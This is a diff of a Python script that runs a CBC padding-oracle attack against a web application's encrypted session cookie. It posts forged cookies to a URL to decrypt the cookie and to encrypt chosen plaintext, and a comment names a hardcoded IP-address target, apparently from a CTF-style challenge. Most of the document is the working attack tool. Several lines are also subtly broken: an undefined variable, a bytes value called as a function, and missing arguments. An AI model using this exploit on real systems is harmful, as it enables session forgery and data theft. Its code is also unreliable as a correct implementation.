@@ -1,140 +1,147 @@
 #!/usr/bin/env python
 from base64 import b64decode, b64encode
 from binascii import hexlify, unhexlify
-from cookie import Cookie
 from urllib.parse import quote, unquote
 import argparse
 import requests
 
-def decrypt_last_block(mycookie, ciphertext, block_size, print_result = True):
-    ciphertext_to_decrypt = ciphertext[-block_size:]
-    pre_ciphertext = ciphertext[-block_size * 2: -block_size]
-    head_ciphertext = ciphertext[:-block_size * 2]
+def unpaddingPKCS7(bytestr):
+    i = bytestr[-1]
+    if bytes([i] * i) != bytestr[-i:]:
+        raise ValueError('{} bad padding'.format(bytestr))
+    return bytestr[:-i]
 
-    known_bytes = b''
-    while len(known_bytes) < block_size:
-        n = len(known_bytes)
-        for i in range(256):
-            if i != n + 1:
-                b1 = bytes([0] * (block_size - 1 - n) + [i]) + known_bytes
-                b2 = bytes([0] * (block_size - 1 - n) + [n + 1] * (n + 1))
-                
-                ciphertext = head_ciphertext + \
-                             bytes([pre_ciphertext[i] ^ b1[i] ^ b2[i] for i in range(block_size)]) + \
-                             ciphertext_to_decrypt
-                try:
-                    mycookie.get_plaintext(b64encode(ciphertext).decode())
-                    known_bytes = bytes([i]) + known_bytes
+def paddingPKCS7(bytestr, size):
+    i = size - (len(bytestr) % size)
+    return bytestr + bytes([i] * i)
 
-                    if print_result:
-                        print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - n))
-                    
-                    break
-                except:
-                    continue
-        else:
-            known_bytes = bytes([n+1]) + known_bytes
-
-            if print_result:
-                print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - n))
-    
-    return known_bytes
-
-def decrypt_attack(mycookie, ciphertext, block_size, encoding = 0, print_result = False):
+def decode_encrypted_sample(encrypted_sample, encoding):
     '''
-      encoding:
-              0 - base64
-              1 - url token + base64
-              2 - hex
-
+    encoding:
+        0 - base64
+        1 - url token + base64
+        2 - hex
     '''
     if encoding == 0:
-        ciphertext = b64decode(ciphertext)
+        return b64decode(encrypted_sample)
     elif encoding == 1:
-        ciphertext = b64decode(unquote(ciphertext))
+        return b64decode(unquote(encrypted_sample))
     elif encoding == 2:
-        ciphertext = unhexlify(ciphertext)
+        return unhexlify(encrypted_sample)
 
+def encode_encrypted_plaintext(encrypted_plaintext, encoding):
+    if encoding == 0 or encoding == 1:
+        return quote(b64encode(encrypted_plaintext).decode())
+    elif encoding == 2:
+        return hexlify(encrypted_plaintext).decode()
+
+def padding_attack(ciphertext, block_size, known_bytes, guess_byte):
+    b1 = bytes([0] * (block_size - 1 - len(known_bytes)) + [guess_byte]) + known_bytes
+    b2 = bytes([0] * (block_size - 1 - len(known_bytes)) + [len(known_bytes) + 1] * (len(known_bytes) + 1)) # new padding
     
-    plaintext = b""
+    return ciphertext[:-block_size * 2] + \
+           bytes([ciphertext[-block_size * 2 + i] ^ b1[i] ^ b2[i] for i in range(block_size)]) + \
+           ciphertext[-block_size:]
 
-    ciphertext_block_number = len(ciphertext) // block_size
-
-    for i in range(1, ciphertext_block_number):
-        if print_result:
-            print("\n*** Starting Block {} of {} ***\n".format(i, ciphertext_block_number - 1))
-        
-        current_ciphertext = ciphertext_blocks[:(i + 1) * block_size]
-        ciphertext_to_decrypt = current_ciphertext[-block_size:]
-        current_plaintext = decrypt_last_block(mycookie, current_ciphertext, print_result)
-        intermediate_bytes = hexlify(bytes([ciphertext_to_decryp[i] ^ current_plaintext[i] for i in range(block_size)]))
-        
-        if i == ciphertext_block_number - 1:
-            #unpadding
-            j = current_plaintext[-1]
-            if bytes([j] * j) == current_plaintext[-j:]:
-                current_plaintext = current_plaintext[:-j]
-
-        if print_result:
-            print("\nBlock {} Results:".format(i))
-            print("[+] Cipher Text (HEX): {}".format(hexlify(ciphertext_to_decryp).decode()))
-            print("[+] Intermediate Bytes (HEX): {}".format(intermediate_bytes.decode()))
-            print("[+] Plain Text: {}".format(current_plaintext.decode()))
-        
-        plaintext += current_plaintext
-
-    if print_result:
-        print("-------------------------------------------------------")
-        print("** Finished ***\n")
-        print("[+] Decrypted value (ASCII): {}\n".format(plaintext.decode()))
-        print("[+] Decrypted value (HEX): {}\n".format(hexlify(plaintext).decode()))
-        print("[+] Decrypted value (Base64): {}\n".format(b64encode(plaintext).decode()))
-        print("-------------------------------------------------------\n")
-    return plaintext
-
-def encrypt_attact(mycookie, ciphertext_sample, block_size, plaintext, encoding = 0, print_result = False):
-    ciphertext_sample = b64decode(ciphertext_sample)
-
-    #padding plaintext
-    padding = block_size - (len(plaintext) % block_size)
-    plaintext = plaintext.encode() + bytes([padding] * padding)
-
-    if len(ciphertext_sample) >= len(plaintext) + block_size:
-        ciphertext_sample = ciphertext_sample[:len(plaintext) + block_size]
+def padding_encrypted_sample(encrypted_sample, plaintext_length, block_size):
+    if len(encrypted_sample) >= plaintext_length + block_size:
+        return encrypted_sample[:plaintext_length + block_size]
     else:
-        k = len(plaintext) + block_size - len(ciphertext_sample)
-        #padding with '0'
-        ciphertext_sample += bytes([0] * k)
+        return encrypted_sample + bytes([0] * (plaintext_length + block_size - len(encrypted_sample)))
 
-    last_sample_plaintext = decrypt_last_block(mycookie, ciphertext_sample, block_size)
-    plaintext_blocks = [plaintext[i : i + block_size] for i in range(0, len(plaintext), block_size)]
-    ciphertext = ciphertext_sample[-block_size:]
+def decrypted_block_results(block_number, cipher_text, intermediate_bytes, plain_text):
+    print("\nBlock {} Results:".format(block_number))
+    print("[+] Cipher Text (HEX): {}".format(hexlify(cipher_text).decode()))
+    print("[+] Intermediate Bytes (HEX): {}".format(hexlify(intermediate_bytes).decode()))
+    print("[+] Plain Text: {}".format(plain_text.decode()))
 
-    for i in range(len(plaintext_blocks) - 1, -1, -1):
-        current_plaintext = plaintext_blocks[i]
-        pre_ciphertext = ciphertext_sample[-block_size * 2:-block_size]
-        intermediate_bytes = bytes([pre_ciphertext[j] ^ last_sample_plaintext[j] for j in range(block_size)])
-        current_ciphertext = bytes([intermediate_bytes[j] ^ current_plaintext[j] for j in range(block_size)])  
-        
+def decrypted_output(decrypted):
+    print("-------------------------------------------------------")
+    print("** Finished ***\n")
+    print("[+] Decrypted value (ASCII): {}\n".format(decrypted.decode()))
+    print("[+] Decrypted value (HEX): {}\n".format(hexlify(decrypted).decode()))
+    print("[+] Decrypted value (Base64): {}\n".format(b64encode(decrypted).decode()))
+    print("-------------------------------------------------------\n")
+
+def encrypted_block_results(block_number, cipher_text, intermediate_bytes):
+    print("\nBlock {} Results:".format(block_number))
+    print("[+] New Cipher Text (HEX): {}".format(hexlify(cipher_text).decode()))
+    print("[+] Intermediate Bytes (HEX): {}\n".format(hexlify(intermediate_bytes).decode()))
+
+def encrypted_output(encrypted):
+    print("-------------------------------------------------------")
+    print("** Finished ***\n")
+    print("[+] Encrypted value is: {}".format(encrypted))
+    print("-------------------------------------------------------")
+
+def decrypt_last_block(url, ciphertext, block_size, print_result = True): 
+    
+    known_bytes = b''
+    while len(known_bytes) < block_size:
+        for i in range(256):
+            if i != len(known_bytes) + 1:
+                ciphertext = padding_attack(ciphertext, block_size, known_bytes, i)
+                if exam_ciphertext(url, quote(b64encode(ciphertext).decode())):
+                    if print_result:
+                        print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - len(known_bytes)))
+                    known_bytes = bytes([b]) + known_bytes
+                    break
+        else:
+            if print_result:
+                print("[+] Success: ({}/256) [Byte {}]".format(len(known_bytes) + 1, block_size - len(known_bytes)))
+            known_bytes = bytes([len(known_bytes)]) + known_bytes 
+    return known_bytes
+
+def decrypt_attack(url, encrypted_sample, block_size, encoding = 0, print_result = False):
+    encrypted_sample = decode_encrypted_sample(encrypted_sample, encoding)
+    decrypted_sample = b""
+    for i in range(1, (len(encrypted_sample) // block_size)):
         if print_result:
-            print("\nBlock {} Results:".format(i + 1))
-            print("[+] New Cipher Text (HEX): {}".format(hexlify(current_ciphertext).decode()))
-            print("[+] Intermediate Bytes (HEX): {}\n".format(hexlify(intermediate_bytes).decode()))
+            print("\n*** Starting Block {} of {} ***\n".format(i, (len(encrypted_sample) // block_size)))
+        
+        cipher_text = encrypted_sample[:(i + 1) * block_size]
+        plain_text = decrypt_last_block(url, cipher_text, print_result)
+        intermediate_bytes = bytes([cipher_text[-block_size + j] ^ plain_text[j] for j in range(block_size)])
 
-        ciphertext_sample = ciphertext_sample[:-block_size] + current_ciphertext
-        last_sample_plaintext = decrypt_last_block(mycookie, ciphertext_sample, block_size)
+        if i == (len(encrypted_sample) // block_size) - 1:
+            plain_text = unpaddingPKCS7(plain_text)
 
-        ciphertext = current_ciphertext + ciphertext
+        if print_result:
+            decrypted_block_results(i, cipher_text[-block_size:], \
+                                    intermediate_bytes(cipher_text[-block_size:], plain_text, block_size), \
+                                    plain_text)
 
-    ciphertext = quote(b64encode(ciphertext).decode())
+        decrypted_sample += plain_text
 
     if print_result:
-        print("-------------------------------------------------------")
-        print("** Finished ***\n")
-        print("[+] Encrypted value is: {}".format(ciphertext))
-        print("-------------------------------------------------------")
+        decrypted_output(decrypted_sample)
+    
+    return decrypted_sample
 
-    return ciphertext
+def encrypt_attact(url, encrypted_sample, block_size, plaintext, encoding = 0, print_result = False):
+    encrypted_sample = decode_encrypted_sample(encrypted_sample, encoding)
+    plaintext = paddingPKCS7(plaintext.encode())
+    encrypted_sample = padding_encrypted_sample(encrypted_sample, len(plaintext), block_size)
+    
+    encrypted_plaintext = encrypted_sample[-block_size:]
+
+    for i in range((len(plaintext) // block_size) - 1, -1, -1):
+        decrypted_sample_last_block = decrypt_last_block(url, encrypted_sample, block_size)
+
+        intermediate_bytes = bytes([encrypted_sample[-block_size * 2 + j] ^ decrypted_sample_last_block[j] for j in range(block_size)])
+        cipher_text = bytes([intermediate_bytes[j] ^ plaintext[i * block_size + j] for j in range(block_size)])  
+        encrypted_plaintext = cipher_text + encrypted_plaintext
+
+        if print_result:
+            encrypted_block_results(i + 1, cipher_text, intermediate_bytes)
+            
+        encrypted_sample = encrypted_sample[:-block_size * 2] + cipher_text
+
+    encrypted_plaintext = encode_encrypted_plaintext(encrypted_plaintext, encoding)
+    if print_result:
+        encrypted_output(encrypted_plaintext)
+
+    return encrypted_plaintext
 
 def parse_options():
     parser = argparse.ArgumentParser(usage='%(prog)s <URL> <EncryptedSample> <BlockSize> [options]',
@@ -155,20 +162,43 @@ def parse_options():
     return args
 
 
+def exam_ciphertext(url, encrypted):
+    #print(encrypted)
+    cookie = {"iknowmag1k" : encrypted}
+    response = requests.post(url, cookies=cookie)
+
+    if response.status_code == 200:
+        return True
+    return False
+
 if __name__ == "__main__":
     args = parse_options()
 
+    #http://88.198.233.174:40068/profile.php
     url = args.URL
     encrypted_sample = args.EncryptedSample
     block_size = args.BlockSize
+    if args.encoding:
+        encoding = args.encoding
+    else:
+        encoding = 0
 
-    # message = "The MAC bug allows an attacker to submit"
-    # mycookie = Cookie()
-    # ciphertext = mycookie.get_ciphertext(message)
-    # #decrypt_attack(mycookie, ciphertext, 16)
+    if args.plaintext:
+        plaintext = args.plaintext
+        encrypt_attact(url, encrypted_sample, block_size, plaintext, encoding, True)
+    else:
+        
+        decrypt_attack(url, encrypted_sample, block_size, encoding, True)
+
+    # url = "http://88.198.233.174:40068/profile.php"
+    # cookie = {"iknowmag1k" : "tkmd8YTl%2B4Av6DlM8o3Rr1F523E0MF0Sh5jPFwa9pvgxMao8A9mSQA%3D%3D"}
+    # response = requests.post(url, cookies=cookie)
+    # print(response)
+
+
+
     
-    # plain = "IV's which are processed by the server in CBC mode"
-    # cipher = encrypt_attact(mycookie, ciphertext, 16, plain, print_result = True)
+
 
 
     
